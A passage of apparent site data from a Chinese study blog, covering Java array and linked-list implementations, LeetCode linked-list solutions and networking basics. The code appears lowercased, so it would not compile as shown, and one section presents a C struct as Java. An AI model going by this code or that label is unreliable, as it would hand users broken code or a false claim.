指定的索引位置\n     * @param element 索引位置原来的元素\n     */\n  public void add(int index, e element) {\n    checkindexforadd(index);\n    ensurecapacity(size + 1);\n    for (int i = size; i > index ; i --){\n      elems[i] = elems[i-1];\n    }\n    elems[index] = element;\n    size ++;\n  }\n\n  /**\n     * 删除index位置的元素\n     *\n     * @param index 指定索引位置\n     * @return 删除位置之前的元素\n     */\n  public e remove(int index) {\n    checkindex(index);\n    e oldelem = elems[index];\n    for (int i = index + 1; i < size ; i ++){\n      elems[i - 1] = elems[i];\n    }\n    elems[--size] = null;\n    return oldelem;\n  }\n\n  /**\n     * 查看元素的索引\n     *\n     * @param element 指定查找的元素\n     * @return 元素的索引\n     */\n  public int indexof(e element) {\n    if (element == null) return -1;\n    for (int i = 0; i < size ; i++){\n      if (element.equals(elems[i])){\n        return i;\n      }\n    }\n    return element_not_found;\n  }\n\n  /**\n     * 保证要有capacity的容量\n     *\n     * @param capacity 当前容量\n     */\n  private void ensurecapacity(int capacity) {\n    int oldcapacity = elems.length;\n    if (oldcapacity >= capacity) return;\n    int newcapacity = oldcapacity + (oldcapacity >> 1);\n    e[] newelems = (e[]) new object[newcapacity];\n    for (int i = 0; i < elems.length; i ++){\n      newelems[i] = elems[i];\n    }\n    elems = newelems;\n  }\n\n  private void checkindex(int index){\n    if (index < 0 || index >= size){\n      throw new indexoutofboundsexception("元素索引越界--"+"[index]:"+index+", [size]:"+size);\n    }\n  }\n\n  private void checkindexforadd(int index){\n    if (index < 0 || index > size){\n      throw new indexoutofboundsexception("元素索引越界--"+"[index]:"+index+", [size]:"+size);\n    }\n  }\n\n}\n\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n51\n52\n53\n54\n55\n56\n57\n58\n59\n60\n61\n62\n63\n64\n65\n66\n67\n68\n69\n70\n71\n72\n73\n74\n75\n76\n77\n78\n79\n80\n81\n82\n83\n84\n85\n86\n87\n88\n89\n90\n91\n92\n93\n94\n95\n96\n97\n98\n99\n100\n101\n102\n103\n104\n105\n106\n107\n108\n109\n110\n111\n112\n113\n114\n115\n116\n117\n118\n119\n120\n121\n122\n123\n124\n125\n126\n127\n128\n129\n130\n131\n132\n133\n134\n135\n136\n137\n138\n139\n140\n141\n142\n143\n144\n145\n146\n147\n148\n149\n150\n151\n152\n153\n154\n155\n156\n157\n158\n159\n160\n161\n162\n163\n164\n165\n166\n167\n168\n169\n170\n171\n172\n173\n174\n175\n176\n177\n178\n179\n180\n\n\n\n# 线性表的链式表示和实现（java语言版）\n\n\n# 单链表的定义和表示\n\n> 线性表的链式存储结构的特点是：使用一组人意的存储单元存储线性表中的数据元素，可以是连续的，也可以是不连续的。\n\n为了表示每个元素和其后继元素之间的关系，除了存储数据本身的信息之外，还需要一个存储后继元素位置的区域。我们通常讲：数据域和指针域。指针域中存储的信息为指针或者链。n个链结合成一个链表称为线性表。(a1,a2,……an)\n\n**根据链表的指针的个数、方向、连接方式等，链表又可以分为：单链表、循环链表、双向链表、二叉链表、十字链表、邻接表、邻接多重表等。**单链表、循环链表和双向链表用于实现线性表的链式存储结构。其他形式多用于实现树或者图等非线性的结构。\n\n在java中，单链表的存储结构可以定义为：\n\ntypedef int elemtype;\n\ntypedef struct {\n  elemtype data;\n  struct lnode *next;\n}lnode, *linklist;\n\n\n1\n2\n3\n4\n5\n6\n\n\n一般情况下，往往在单链表的第一个节点之前设置一个节点，称为头节点。这里我们先不要添加头结点。\n\n * 头节点是在首元结点之前附设的一个结点，指针域指向首元素结点。\n * 头指针是指向链表中第一个结点的指针，若链表设置有头结点，则头指针指向头结点。\n\n给链表增加头结点的好处：\n\n * 便于首元节点的处理。\n * 便于空表和非空表的统一处理。\n\n\n# 单链表的基本操作的实现\n\n和顺序表统一接口：\n\npackage com.pwddd;\n\npublic interface list<e> {\n\n  public static final int element_not_found = -1;\n\n  /**\n     * 清除所有元素\n     */\n  void clear();\n\n\n  /**\n     * 元素的数量\n     *\n     * @return 元素的数量\n     */\n  int size();\n\n  /**\n     * 是否为空\n     *\n     * @return 是否为空\n     */\n  boolean isempty();\n\n  /**\n     * 是否包含某个元素\n     *\n     * @param element 指定元素\n     * @return 是否包含\n     */\n  boolean contains(e element);\n\n  /**\n     * 添加元素到尾部\n     *\n     * @param element 指定的元素\n     */\n  void add(e element);\n\n  /**\n     * 获取index位置的元素\n     *\n     * @param index 指定的索引位置\n     * @return 索引位置的元素\n     */\n  e get(int index);\n\n  /**\n     * 设置index位置的元素\n     *\n     * @param index   指定的索引位置\n     * @param element 索引位置原来的元素\n     * @return 原来的元素ֵ\n     */\n  e set(int index, e element);\n\n  /**\n     * 在index位置插入一个元素\n     *\n     * @param index   指定的索引位置\n     * @param element 索引位置原来的元素\n     */\n  void add(int index, e element);\n\n\n  /**\n     * 删除index位置的元素\n     *\n     * @param index 指定索引位置\n     * @return 删除位置之前的元素\n     */\n  e remove(int index);\n\n  /**\n     * 查看元素的索引\n     *\n     * @param element 指定查找的元素\n     * @return 元素的索引\n     */\n  int indexof(e element);\n\n}\n\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n51\n52\n53\n54\n55\n56\n57\n58\n59\n60\n61\n62\n63\n64\n65\n66\n67\n68\n69\n70\n71\n72\n73\n74\n75\n76\n77\n78\n79\n80\n81\n82\n83\n84\n85\n\n\n定义抽象类，将顺序表和链表公共部分抽取出来：\n\npackage com.pwddd;\n\npublic abstract class abstractlist<e> implements list<e> {\n  protected int size;\n  /**\n     * 元素的数量\n     *\n     * @return 元素的数量\n     */\n  public int size() {\n    return size;\n  }\n\n  /**\n     * 是否为空\n     *\n     * @return 是否为空\n     */\n  public boolean isempty() {\n    return size == 0;\n  }\n\n  /**\n     * 是否包含某个元素\n     *\n     * @param element 指定元素\n     * @return 是否包含\n     */\n  public boolean contains(e element) {\n    return indexof(element) != element_not_found;\n  }\n\n  /**\n     * 添加元素到尾部\n     *\n     * @param element 指定的元素\n     */\n  public void add(e element) {\n    add(size,element);\n  }\n\n  protected void checkindex(int index){\n    if (index < 0 || index >= size){\n      throw new indexoutofboundsexception("元素索引越界--"+"[index]:"+index+", [size]:"+size);\n    }\n  }\n\n  protected void checkindexforadd(int index){\n    if (index < 0 || index > size){\n      throw new indexoutofboundsexception("元素索引越界--"+"[index]:"+index+", [size]:"+size);\n    }\n  }\n}\n\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n51\n52\n53\n54\n\n\n单链表的实现：\n\npackage com.pwddd.linkedlist;\n\nimport com.pwddd.abstractlist;\n\npublic class linkedlist<e> extends abstractlist<e> {\n\n  private node<e> first;\n\n  @override\n  public void clear() {\n    size = 0;\n    first = null;\n  }\n\n  @override\n  public e get(int index) {\n    return node(index).element;\n  }\n\n  @override\n  public e set(int index, e element) {\n    node<e> node = node(index);\n    e old = node.element;\n    node.element = element;\n    return old;\n  }\n\n  @override\n  public void add(int index, e element) {\n    if (index == 0){\n      first = new node<e>(element,first);\n    }else {\n      node<e> prenode = node(index - 1);\n      prenode.next = new node<>(element,prenode.next);\n    }\n    size ++;\n  }\n\n  @override\n  public e remove(int index) {\n    checkindex(index);\n    node<e> node = first;\n    if (index == 0){\n      first = first.next;\n    }else {\n      node<e> prev = node(index - 1);\n      node = prev.next;\n      prev.next = node.next;\n    }\n    size--;\n    return node.element;\n  }\n\n  @override\n  public int indexof(e element) {\n    if (element == null){\n      node<e> node = first;\n      for (int i = 0; i < size; i++) {\n        if (node.element == null) return i;\n        node = node.next;\n      }\n    }else {\n      node<e> node = first;\n      for (int i = 0; i < size; i++) {\n        if (element.equals(node.element)){\n          return i;\n        }\n        node = node.next;\n      }\n    }\n    return element_not_found;\n  }\n\n\n  private node<e> node(int index){\n    checkindex(index);\n    node<e> node = first;\n    for (int i = 0; i < index; i++) {\n      node = node.next;\n    }\n    return node;\n  }\n\n\n  private static class node<e> {\n    e element;\n    node<e> next;\n\n    public node(e element, node<e> next) {\n      this.element = element;\n      this.next = next;\n    }\n  }\n}\n\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n51\n52\n53\n54\n55\n56\n57\n58\n59\n60\n61\n62\n63\n64\n65\n66\n67\n68\n69\n70\n71\n72\n73\n74\n75\n76\n77\n78\n79\n80\n81\n82\n83\n84\n85\n86\n87\n88\n89\n90\n91\n92\n93\n94\n95\n\n\n\n# leetcode-反转链表\n\n给你单链表的头节点 head ，请你反转链表，并返回反转后的链表。\n\n示例 1：\n\n\n\n输入：head = [1,2,3,4,5]\n输出：[5,4,3,2,1]\n\n\n1\n2\n\n\n示例 2：\n\n\n\n输入：head = [1,2]\n输出：[2,1]\n\n\n1\n2\n\n\n示例 3：\n\n输入：head = []\n输出：[]\n\n\n1\n2\n\n\n提示：\n\n * 链表中节点的数目范围是 [0, 5000]\n * -5000 <= node.val <= 5000链表\n\n# 递归方式\n\n思路：\n\n边界条件：当传入的head为空，说明传入的是一个空表，或者传入的head的下一个结点为空，说明传入的是一个单结点。以上两种情况直接返回，没有必要反转。\n\n递归的想法就是调用自己完成反转，假设我们这个方法reverselist能够实现反转了，那么当我们传入一个链表的head的时候，就可以将该链表反转，那么当我们传入head的下一个的时候，意味着从head的下一个结点开始，已经完成了反转了。如图所示：\n\n\n\n我们只需要将头结点的下一个结点的下一个结点指向头结点，并且将头结点的下一个结点指向空即可。\n\npublic listnode reverselist(listnode head) {\n  if (head == null || head.next == null) return head;\n  listnode newhead = reverselist(head.next);\n  head.next.next = head;\n  head.next = null;\n  return newhead;\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n\n\n# 迭代方式\n\n迭代方式就相对来讲简单一些，使用双指针的办法。如下代码所示：\n\nclass solution {\n  public listnode reverselist(listnode head) {\n    if (head == null || head.next == null) return head;\n    listnode newhead = null;\n    while (head!= null){\n      listnode tmp = head.next;\n      head.next = newhead;\n      newhead = head;\n      head = tmp;\n    }\n    return newhead;\n  }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n\n\n首先定义一个临时指针，指向head的下一个结点，防止head的下一个结点重新赋值后丢失。然后将head的下一个结点指向newhead，将newhead指向head，然后将head指向tmp。如图所示：\n\n\n\n\n# leetcode - 判断链表是否有环\n\n给你一个链表的头节点 head ，判断链表中是否有环。\n\n如果链表中有某个节点，可以通过连续跟踪 next 指针再次到达，则链表中存在环。 为了表示给定链表中的环，评测系统内部使用整数 pos 来表示链表尾连接到链表中的位置（索引从 0 开始）。注意：pos 不作为参数进行传递 。仅仅是为了标识链表的实际情况。\n\n如果链表中存在环 ，则返回 true 。 否则，返回 false 。\n\n示例 1：\n\n\n\n输入：head = [3,2,0,-4], pos = 1\n输出：true\n解释：链表中有一个环，其尾部连接到第二个节点。\n\n\n1\n2\n3\n\n\n示例 2：\n\n\n\n输入：head = [1,2], pos = 0\n输出：true\n解释：链表中有一个环，其尾部连接到第一个节点。\n\n\n1\n2\n3\n\n\n示例 3：\n\n\n\n输入：head = [1], pos = -1\n输出：false\n解释：链表中没有环。\n\n\n1\n2\n3\n\n\n提示：\n\n * 链表中节点的数目范围是 [0, 104]\n * -105 <= node.val <= 105\n * pos 为 -1 或者链表中的一个 有效索引 。\n\n可以使用快慢指针的方式，就像在操场跑步，快的一定会和慢的有重叠，没有重叠就说明不是环形的。\n\npublic boolean hascycle(listnode head) {\n  if (head == null || head.next == null) return false;\n  listnode fast = head.next;\n  listnode slow = head;\n  while (fast != null && fast.next != null){\n    if (fast ==slow ){\n      return true;\n    }\n    fast = fast.next.next;\n    slow = slow.next;\n  }\n  return false;\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n\n\n\n# leetcode-移除链表的元素\n\n给你一个链表的头节点 head 和一个整数 val ，请你删除链表中所有满足 node.val == val 的节点，并返回 新的头节点 。\n\n示例 1：\n\n\n\n输入：head = [1,2,6,3,4,5,6], val = 6\n输出：[1,2,3,4,5]\n\n\n1\n2\n\n\n示例 2：\n\n输入：head = [], val = 1\n输出：[]\n\n\n1\n2\n\n\n示例 3：\n\n输入：head = [7,7,7,7], val = 7\n输出：[]\n\n\n1\n2\n\n\n提示：\n\n * 列表中的节点数目在范围 [0, 104] 内\n * 1 <= node.val <= 50\n * 0 <= val <= 50\n\n# 递归\n\n\n\npublic listnode removeelements(listnode head, int val) {\n  if (head == null) return head;\n\n  head.next = removeelements(head.next, val);\n\n  return head.val == val ? head.next : head;\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n\n\n# 迭代\n\n使用双指针的方式进行操作。\n\n\n\npublic listnode removeelements(listnode head, int val) {\n  if (head == null) return head;\n  listnode node = new listnode(1);\n  node.next = head;\n  listnode tmp = node;\n  while (tmp.next != null){\n    if (tmp.next.val == val){\n      tmp.next = tmp.next.next;\n    }else {\n      tmp = tmp.next;\n    }\n  }\n  return node.next;\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n',charsets:{cjk:!0},lastUpdated:"2022/05/06, 15:59:11",lastUpdatedTimestamp:1651852751e3},{title:"【计算机网络】概述",frontmatter:{title:"【计算机网络】概述",date:"2022-05-05T23:00:00.000Z",permalink:"/dev/basic/network/introduction",author:{name:"p0jo",link:"https://wiki.pwddd.com"},categories:["开发","计算机基础","计算机网络"],tags:["计算机网络"],readingShow:"top"},regularPath:"/01.%E5%BC%80%E5%8F%91/102.%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9F%BA%E7%A1%80/1021.%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/00.%E6%A6%82%E8%BF%B0.html",relativePath:"01.开发/102.计算机基础/1021.计算机网络/00.概述.md",key:"v-31806689",path:"/dev/basic/network/introduction/",headers:[{level:2,title:"计算机网络在信息时代的作用",slug:"计算机网络在信息时代的作用",normalizedTitle:"计算机网络在信息时代的作用",charIndex:42},{level:2,title:"互联网概述",slug:"互联网概述",normalizedTitle:"互联网概述",charIndex:196},{level:3,title:"网络的网络",slug:"网络的网络",normalizedTitle:"网络的网络",charIndex:206},{level:3,title:"网络的发展阶段",slug:"网络的发展阶段",normalizedTitle:"网络的发展阶段",charIndex:350},{level:3,title:"互联网的标准化工作",slug:"互联网的标准化工作",normalizedTitle:"互联网的标准化工作",charIndex:522},{level:2,title:"互联网的组成",slug:"互联网的组成",normalizedTitle:"互联网的组成",charIndex:654},{level:3,title:"互联网的边缘部分",slug:"互联网的边缘部分",normalizedTitle:"互联网的边缘部分",charIndex:768},{level:3,title:"互联网的核心部分",slug:"互联网的核心部分",normalizedTitle:"互联网的核心部分",charIndex:956},{level:3,title:"电路交换",slug:"电路交换",normalizedTitle:"电路交换",charIndex:1032},{level:3,title:"分组交换",slug:"分组交换",normalizedTitle:"分组交换",charIndex:393},{level:3,title:"报文交换",slug:"报文交换",normalizedTitle:"报文交换",charIndex:1113},{level:2,title:"计算机网络在我国的发展",slug:"计算机网络在我国的发展",normalizedTitle:"计算机网络在我国的发展",charIndex:1163},{level:2,title:"计算机网络的类别",slug:"计算机网络的类别",normalizedTitle:"计算机网络的类别",charIndex:1223},{level:3,title:"计算机网络的定义",slug:"计算机网络的定义",normalizedTitle:"计算机网络的定义",charIndex:1236},{level:3,title:"计算机网络的分类",slug:"计算机网络的分类",normalizedTitle:"计算机网络的分类",charIndex:1319},{level:2,title:"计算机网络的性能",slug:"计算机网络的性能",normalizedTitle:"计算机网络的性能",charIndex:1579},{level:3,title:"非性能指标",slug:"非性能指标",normalizedTitle:"非性能指标",charIndex:2296},{level:2,title:"计算机网络体系结构",slug:"计算机网络体系结构",normalizedTitle:"计算机网络体系结构",charIndex:2363},{level:3,title:"协议和划分层次",slug:"协议和划分层次",normalizedTitle:"协议和划分层次",charIndex:2399},{level:3,title:"五层体系结构",slug:"五层体系结构",normalizedTitle:"五层体系结构",charIndex:2630},{level:3,title:"TCP/IP体系结构",slug:"tcp-ip体系结构",normalizedTitle:"tcp/ip体系结构",charIndex:3e3}],excerpt:'<h1 id="【计算机网络】概述"><a class="header-anchor" href="#【计算机网络】概述">#</a> 【计算机网络】概述</h1>\n<blockquote>\n<p>参考书：计算机网络（第七版）谢希仁先生编著。</p>\n</blockquote>\n',headersStr:"计算机网络在信息时代的作用 互联网概述 网络的网络 网络的发展阶段 互联网的标准化工作 互联网的组成 互联网的边缘部分 互联网的核心部分 电路交换 分组交换 报文交换 计算机网络在我国的发展 计算机网络的类别 计算机网络的定义 计算机网络的分类 计算机网络的性能 非性能指标 计算机网络体系结构 协议和划分层次 五层体系结构 TCP/IP体系结构",content:"# 【计算机网络】概述\n\n> 参考书：计算机网络（第七版）谢希仁先生编著。\n\n\n# 计算机网络在信息时代的作用\n\n> 21世纪的重要特征：数字化、网络化、信息化。是一个以网络为核心的时代。\n\n三大网络：电信网络、有线电视网络、计算机网络\n\n互联网的两个重要的基本特点：\n\n * 连通性：不管距离多远都好像直接彼此相连一样\n * 共享：资源共享，服务器上的资源好像在用户身边一样方便。\n\n\n# 互联网概述\n\n\n# 网络的网络\n\n> 计算机网络：由若干节点和连接节点的链路组成。节点可以是计算机、集线器、交换机等。\n\n网络之间通过路由器连接，形成了一个覆盖范围更大的网络，称为 网络的网络，也就是我们常说的互连网。\n\n网络就是把许多计算机连接在一起，而互连网则是把许多网络通过路由器连接在一起。\n\n\n# 网络的发展阶段\n\n * 单个网络ARPANET项互联网的发展过程\n   \n   第一个分组交换网络：ARPANET （美国国防部创建）\n   \n   1983年TCP/IP协议称为ARPANET的标准协议\n\n * 建成三级结构的互联网\n   \n   三级网络分为：主干网、地区网、校园网（企业网）\n\n * 多层次ISP结构的互联网\n\n\n\n\n# 互联网的标准化工作\n\n互联网标准化组织：互联网协会（ISOC）\n\n * 互联网体系结构委员会（IAB）\n   * 互联网工程部（IETF）\n   * 互联网研究部（IRTF）\n\n指定互联网标准的三阶段\n\n * 互联网草案\n * 建议标准\n * 互联网标准\n\n\n# 互联网的组成\n\n> 从工作方式上，互联网可以划分为两个部分：边缘部分和核心部分。\n\n边缘部分：用户直接使用的，所有连接在互联网上的主机。\n\n核心部分：为边缘部分提供服务，由大量的网络和连接在这些网络上的路由器组成。\n\n\n\n\n# 互联网的边缘部分\n\n互联网的边缘部分是连接在互联网上的所有主机，称为 端系统。\n\n我们常说的主机A和主机B通信，实际上是主机A上的某个程序和主机B上的某一个程序进行通信。简称为计算机之间的通信。\n\n在网络的边缘部分端系统的通信可以分为两大类：\n\n * CS方式\n   \n   客户端是服务请求方，服务器是服务提供方\n   \n   \n\n * P2P方式\n   \n   \n\n\n# 互联网的核心部分\n\n在核心部分起到重要作用的是 路由器。路由器是一种特殊的计算机，路由器是实现 分组交换的关键构件，任务是 转发到其他的分组。\n\n\n# 电路交换\n\n整个报文的比特流从起点到终点，好像在一个管道中传送。\n\n\n# 分组交换\n\n单个分组传到相邻的节点，存储下来，然后查转发表，转发到下一个节点。\n\n\n# 报文交换\n\n整个报文先传送到相邻的节点，全部存储下来，再查询转发表，转发到下一个节点。\n\n\n\n\n# 计算机网络在我国的发展\n\n> 最早建立广域网的是铁道部。1994年4月20日我国用64kbps专线接入互联网。\n\n\n# 计算机网络的类别\n\n\n# 计算机网络的定义\n\n计算机网络并没有严格的定义。一个比较好的定义是：计算机网络是一些通用的、可编程的硬件互连形成的，这些硬件并非专门用来实现某一特定的目的。\n\n\n# 计算机网络的分类\n\n# 按照网络的作用范围分类\n\n 1. 广域网WAN ： 范围几十到几千公里，互联网的核心。\n 2. 城域网MAN：一般范围是一个城市\n 3. 局域网LAN：一般是企业或者校园网络\n 4. 个人区域网PAN：个人工作地方把个人设备连接形成的网络。\n\n# 按照使用者进行分类\n\n 1. 公用网：电信公司建造的公用收费的大型网络\n 2. 专用网：特殊单位的特殊用途的网络\n\n# 用户接入网络\n\n这种网络称为接入网AN，又称为本地接入网，或者居民接入网。这种网络比较特殊，通过ISP进行接入互联网。\n\n\n# 计算机网络的性能\n\n# 1. 速率\n\n一个bit是一个二进制的0或者1。比特是信息论中使用的信息量的单位。\n\n速率值的是数据的传送速率。也称为数据率、比特率。单位是：bit/s、bps 、b/s。\n\n# 2. 带宽\n\n带宽本来的意思是信号的频带宽度，单位是赫兹。在计算机网络中，带宽用于表示网络中某个通道的传送数据的能力。网络的带宽表示单位时间内，网络中的某个信道的最高数据率。带宽的单位就是数据率的单位。\n\n# 3. 吞吐量\n\n吞吐量表示在单位时间通过网络（信道、接口）的实际数据量。\n\n# 4. 时延\n\n时延是指数据从网络的一端到另一端所需的时间。也称为 延迟、迟延。\n\n时延= 发送时延 + 传播时延 + 处理时延 + 排队时延\n\n# 发送时延\n\n主机或者路由器发送数据帧所需要的时间，从第一个比特算起到最后一个比特发送完成所需的时间。\n\n\n\n# 传播时延\n\n传播时延是电磁波在信道中传播一定的距离花费的时间。\n\n\n\n# 处理时延\n\n主机或者路由器从收到数据包到发送数据包之间处理数据的时间。进行分析、提取、差错校验等花费的时间。\n\n# 排队时延\n\n分组在经过网络传输中需要经过多个路由器，需要进行等待。\n\n\n\n# 5.时延带宽积\n\n传播时延和带宽相乘，得到的时延带宽积。表示管道的体积，可以最大容纳多少bit通过。\n\n\n\n# 6.往返时间（RTT）\n\n往返时间是一个重要的指标。数据从发送到响应之间的时间。\n\n# 7.利用率\n\n利用率有两种，一种是信道利用率，还有一种是网络利用率。如果D0表示网络空闲时的时延，D表示当前网络的时延。则和利用率U的关系为：\n\n\n\n因此，信道或者网络的利用率过高则会导致时延增大。\n\n\n\n\n# 非性能指标\n\n 1. 费用\n 2. 质量\n 3. 标准化\n 4. 可靠性\n 5. 可扩展性和可升级性\n 6. 易于管理和维护\n\n\n# 计算机网络体系结构\n\n> 开放系统互连基本参考模型OSI/RM\n\n\n# 协议和划分层次\n\n在计算机网络中交换数据就和寄快递一样，需要遵守一些事先约定好的规则，这些规则明确规定了交换的数据的格式和有关的同步问题。\n\n网络协议由以下三部分组成：\n\n * 语法：数据和控制信息的格式\n * 语义：控制信息的种类、动作和响应。\n * 同步：事件的执行顺序\n\n划分层次的好处：\n\n * 各层之间相互独立\n * 灵活性好\n * 结构上分割\n * 易于实现和维护\n * 促进标准化工作\n\n计算机网络的各层及其协议的集合就是网络的体系结构。\n\n\n# 五层体系结构\n\nOSI七层的体系结构概念清晰、理论完整，但是并不实用。\n\n\n\n * 应用层：通过进程之间的交互完成特定的网络应用。常见的协议（DNS、HTTP、HTTPS、SMTP等），交换的数据单元为报文。\n * 运输层：两台主机中进程之间的通信提供数据传输服务。主要的协议：传输控制协议（TCP、可靠传输、面向连接、报文段）、数据用户报协议（UDP、无连接、最大努力的数据传输、用户数据报）\n * 网络层：负责为分组交换网上的不同主机提供服务。将运输层产生的报文段封装成分组或者包进行传送。网络层使用IP协议，分组称为IP数据报。\n * 数据链路层：称为链路层。将网络层的IP数据报封装成数据帧。MAC地址工作的层级。\n * 物理层：传输的是比特。\n\n\n\nOSI参考模型把对等层次之间传送的数据单元称为该层的协议数据单元PDU\n\n\n# TCP/IP体系结构\n\nTCP/IP只由四层结构。\n\n\n\n但是技术的发展并没有严格遵循这个体系结构。如下图所示：\n\n",normalizedContent:"# 【计算机网络】概述\n\n> 参考书：计算机网络（第七版）谢希仁先生编著。\n\n\n# 计算机网络在信息时代的作用\n\n> 21世纪的重要特征：数字化、网络化、信息化。是一个以网络为核心的时代。\n\n三大网络：电信网络、有线电视网络、计算机网络\n\n互联网的两个重要的基本特点：\n\n * 连通性：不管距离多远都好像直接彼此相连一样\n * 共享：资源共享，服务器上的资源好像在用户身边一样方便。\n\n\n# 互联网概述\n\n\n# 网络的网络\n\n> 计算机网络：由若干节点和连接节点的链路组成。节点可以是计算机、集线器、交换机等。\n\n网络之间通过路由器连接，形成了一个覆盖范围更大的网络，称为 网络的网络，也就是我们常说的互连网。\n\n网络就是把许多计算机连接在一起，而互连网则是把许多网络通过路由器连接在一起。\n\n\n# 网络的发展阶段\n\n * 单个网络arpanet项互联网的发展过程\n   \n   第一个分组交换网络：arpanet （美国国防部创建）\n   \n   1983年tcp/ip协议称为arpanet的标准协议\n\n * 建成三级结构的互联网\n   \n   三级网络分为：主干网、地区网、校园网（企业网）\n\n * 多层次isp结构的互联网\n\n\n\n\n# 互联网的标准化工作\n\n互联网标准化组织：互联网协会（isoc）\n\n * 互联网体系结构委员会（iab）\n   * 互联网工程部（ietf）\n   * 互联网研究部（irtf）\n\n指定互联网标准的三阶段\n\n * 互联网草案\n * 建议标准\n * 互联网标准\n\n\n# 互联网的组成\n\n> 从工作方式上，互联网可以划分为两个部分：边缘部分和核心部分。\n\n边缘部分：用户直接使用的，所有连接在互联网上的主机。\n\n核心部分：为边缘部分提供服务，由大量的网络和连接在这些网络上的路由器组成。\n\n\n\n\n# 互联网的边缘部分\n\n互联网的边缘部分是连接在互联网上的所有主机，称为 端系统。\n\n我们常说的主机a和主机b通信，实际上是主机a上的某个程序和主机b上的某一个程序进行通信。简称为计算机之间的通信。\n\n在网络的边缘部分端系统的通信可以分为两大类：\n\n * cs方式\n   \n   客户端是服务请求方，服务器是服务提供方\n   \n   \n\n * p2p方式\n   \n   \n\n\n# 互联网的核心部分\n\n在核心部分起到重要作用的是 路由器。路由器是一种特殊的计算机，路由器是实现 分组交换的关键构件，任务是 转发到其他的分组。\n\n\n# 电路交换\n\n整个报文的比特流从起点到终点，好像在一个管道中传送。\n\n\n# 分组交换\n\n单个分组传到相邻的节点，存储下来，然后查转发表，转发到下一个节点。\n\n\n# 报文交换\n\n整个报文先传送到相邻的节点，全部存储下来，再查询转发表，转发到下一个节点。\n\n\n\n\n# 计算机网络在我国的发展\n\n> 最早建立广域网的是铁道部。1994年4月20日我国用64kbps专线接入互联网。\n\n\n# 计算机网络的类别\n\n\n# 计算机网络的定义\n\n计算机网络并没有严格的定义。一个比较好的定义是：计算机网络是一些通用的、可编程的硬件互连形成的，这些硬件并非专门用来实现某一特定的目的。\n\n\n# 计算机网络的分类\n\n# 按照网络的作用范围分类\n\n 1. 广域网wan ： 范围几十到几千公里，互联网的核心。\n 2. 城域网man：一般范围是一个城市\n 3. 局域网lan：一般是企业或者校园网络\n 4. 个人区域网pan：个人工作地方把个人设备连接形成的网络。\n\n# 按照使用者进行分类\n\n 1. 公用网：电信公司建造的公用收费的大型网络\n 2. 专用网：特殊单位的特殊用途的网络\n\n# 用户接入网络\n\n这种网络称为接入网an，又称为本地接入网，或者居民接入网。这种网络比较特殊，通过isp进行接入互联网。\n\n\n# 计算机网络的性能\n\n# 1. 速率\n\n一个bit是一个二进制的0或者1。比特是信息论中使用的信息量的单位。\n\n速率值的是数据的传送速率。也称为数据率、比特率。单位是：bit/s、bps 、b/s。\n\n# 2. 带宽\n\n带宽本来的意思是信号的频带宽度，单位是赫兹。在计算机网络中，带宽用于表示网络中某个通道的传送数据的能力。网络的带宽表示单位时间内，网络中的某个信道的最高数据率。带宽的单位就是数据率的单位。\n\n# 3. 吞吐量\n\n吞吐量表示在单位时间通过网络（信道、接口）的实际数据量。\n\n# 4. 时延\n\n时延是指数据从网络的一端到另一端所需的时间。也称为 延迟、迟延。\n\n时延= 发送时延 + 传播时延 + 处理时延 + 排队时延\n\n# 发送时延\n\n主机或者路由器发送数据帧所需要的时间，从第一个比特算起到最后一个比特发送完成所需的时间。\n\n\n\n# 传播时延\n\n传播时延是电磁波在信道中传播一定的距离花费的时间。\n\n\n\n# 处理时延\n\n主机或者路由器从收到数据包到发送数据包之间处理数据的时间。进行分析、提取、差错校验等花费的时间。\n\n# 排队时延\n\n分组在经过网络传输中需要经过多个路由器，需要进行等待。\n\n\n\n# 5.时延带宽积\n\n传播时延和带宽相乘，得到的时延带宽积。表示管道的体积，可以最大容纳多少bit通过。\n\n\n\n# 6.往返时间（rtt）\n\n往返时间是一个重要的指标。数据从发送到响应之间的时间。\n\n# 7.利用率\n\n利用率有两种，一种是信道利用率，还有一种是网络利用率。如果d0表示网络空闲时的时延，d表示当前网络的时延。则和利用率u的关系为：\n\n\n\n因此，信道或者网络的利用率过高则会导致时延增大。\n\n\n\n\n# 非性能指标\n\n 1. 费用\n 2. 质量\n 3. 标准化\n 4. 可靠性\n 5. 可扩展性和可升级性\n 6. 易于管理和维护\n\n\n# 计算机网络体系结构\n\n> 开放系统互连基本参考模型osi/rm\n\n\n# 协议和划分层次\n\n在计算机网络中交换数据就和寄快递一样，需要遵守一些事先约定好的规则，这些规则明确规定了交换的数据的格式和有关的同步问题。\n\n网络协议由以下三部分组成：\n\n * 语法：数据和控制信息的格式\n * 语义：控制信息的种类、动作和响应。\n * 同步：事件的执行顺序\n\n划分层次的好处：\n\n * 各层之间相互独立\n * 灵活性好\n * 结构上分割\n * 易于实现和维护\n * 促进标准化工作\n\n计算机网络的各层及其协议的集合就是网络的体系结构。\n\n\n# 